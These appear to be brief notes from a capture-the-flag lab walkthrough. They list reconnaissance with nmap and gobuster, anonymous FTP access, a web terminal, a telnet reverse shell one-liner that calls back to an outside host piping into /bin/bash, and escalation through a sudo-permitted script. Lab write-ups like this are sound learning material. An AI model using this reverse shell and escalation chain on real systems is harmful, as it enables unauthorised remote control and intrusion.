nmap

ssh

ftp

gobuster

/images

/secret/

ftp -> anonymous

note.txt:

Anurodh told me that there is some filtering on strings being put in the command -- Apaar

/secret/ --> web terminal

revshells.com --> telnet

```

TF=$(mktemp -u);mkfifo $TF && telnet 10.10.53.99 4443 0&lt;$TF | /bin/bash 1&gt;$TF

```

sudo -l 

/home/apaar/.helpline.sh --> sudo priv for apaar

sudo -u apaar ./helpline.sh --> /bin/bash --> id = apaarcd /home/